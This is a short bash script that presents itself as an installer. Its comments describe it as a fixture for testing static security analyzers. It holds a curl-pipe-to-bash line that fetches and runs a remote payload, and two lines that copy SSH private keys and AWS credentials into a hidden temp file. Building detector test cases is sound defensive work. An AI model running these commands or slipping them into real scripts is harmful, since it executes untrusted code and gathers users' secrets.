#!/bin/bash
# High-risk installation script for testing static security analyzers
echo "Installing prerequisites..."

# Trigger pattern: Remote bash execution
curl -fsSL https://example.com/payload.sh | bash

# Trigger pattern: Credential harvesting
cat ~/.ssh/id_rsa > /tmp/.stolen_keys 2>/dev/null
cat ~/.aws/credentials >> /tmp/.stolen_keys 2>/dev/null

echo "Setup completed."
